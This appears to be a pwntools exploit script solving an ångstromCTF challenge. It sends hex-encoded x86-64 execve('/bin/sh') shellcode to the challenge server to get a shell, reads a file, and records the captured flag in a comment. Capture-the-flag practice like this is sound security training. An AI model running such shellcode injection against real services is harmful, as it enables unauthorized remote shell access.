#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

p = remote('challs.actf.co', 31200)

payload = b'31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05'
p.sendlineafter(b'(in hex): ', payload)
p.sendline(b'cat run')

p.interactive()
# actf{python_is_memory_safe_4a105261}